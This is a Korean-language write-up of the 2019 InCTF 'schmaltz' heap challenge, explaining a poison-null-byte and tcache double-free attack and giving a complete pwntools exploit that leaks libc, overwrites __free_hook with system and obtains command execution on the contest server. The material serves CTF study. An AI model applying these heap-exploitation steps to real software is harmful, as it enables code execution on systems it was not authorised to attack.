---
title: InCTF schmaltz write up
categories: [2019, InCTF ]
tags: [CTF, heap, 18.10, tcache]
---

InCTF write up

subject   | problem
----------|------------
CTF       | 2019 InCTF
Tags      | pwn
score     | x
env       | ubunutu 18.10
problem   | x64, fsb, bof, easy

# analysis
double free가 가능한 tcache heap 문제이다. 18.10의 libc-2.28을 쓰기 때문에 tcache의 double free가 막혀 있다.
하지만 poison null byte 취약점이 존재하기 때문에 예를들어 0x121만큼 alloc 영역을 free를 하고, 0x100으로 덮은다음에 alloc 영역을 free를 한다면
attack이 가능하다.

실제 대회에서는 system("/bin/sh")를 막아놨는지 작동이 안됬는데 orw를 원한것으로 예측이 되지만 시간이 부족하여 시도해보진 못했다.

# solve
1. malloc을 두개 할당 한 후 free (ex 0x111)
2. 뒤에 할당한 malloc의 사이즈를 0x100으로 수정
3. 사이즈가 0x100으로 바뀐 alloc을 free(double free, size 0x100, 0x110 tcache에 들어가게 됨)
4. 취약점이 발생한 곳에 alloc후 다음 malloc할 주소 (free된 영역을 관리하는 bss영역)을 write
5. heap관리하는 부분에 got부분을 넣어서 leak
6. 같은 취약점을 이용해서 free_hook에 값을 쓰고 eip 컨트롤

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "52.23.219.15"
    port = 1337

def inp(data, line = 1):
    s.recvuntil("> ")
    if line == 1:
        s.sendline(str(data))
    else:
        s.send(str(data))

def menu(index):
    inp(index)

def add(size, data, line = 1):
    menu(1)
    inp(size)
    inp(data, line)

def remove(index):
    menu(4)
    inp(index)

def pwn():
    for i in range(0, 6):
        add(264, p64(0x000000000602090))

    remove(1)
    remove(0)

    add(264, "A"*264, line = 0)
    remove(1)

    add(264, p64(0x000000000602080))
    add(248, "AAAAAAAA")
    add(248, (p64(0x601FA0) + p64(0x0000000100000108) + p64(0)*8 + p64(2)))

    menu(3)
    inp(2)
    s.recvuntil("Content: ")
    libc_base = u64(s.recvuntil("\n")[:-1].ljust(8, "\x00")) - 0x81310
    free_hook = libc_base + 0x3b28e8
    system_addr = libc_base + 0x41bf0

    log.info("libc_base        : " + str(hex(libc_base)))
    log.info("free_hook        : " + str(hex(free_hook)))
    log.info("system_addr      : " + str(hex(system_addr)))

    add(100, p64(free_hook))

    for i in range(0, 3):
        add(248, "ls>&0\x00\x00")

    remove(0)

    add(248, p64(system_addr))
    remove(5)

if __name__ == "__main__":
    s = remote(host, port)
    pwn()
    s.interactive()
```
